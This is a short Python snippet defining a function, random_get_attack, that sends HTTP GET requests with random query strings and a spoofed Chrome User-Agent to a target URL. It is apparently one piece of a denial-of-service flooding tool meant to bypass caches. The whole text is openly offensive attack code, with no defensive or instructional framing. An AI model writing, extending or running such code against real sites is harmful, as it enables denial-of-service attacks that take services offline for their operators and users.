import random
import requests
import time

# Generate random query strings to simulate GET requests
def random_get_attack(target_url):
    query_string = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=10))
    url = f"{target_url}?q={query_string}"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    }
    try:
        requests.get(url, headers=headers, timeout=5)
        print(f"[RANDOM GET] Sent request to {url}")
    except requests.exceptions.RequestException:
        print("[RANDOM GET] Connection failed.")
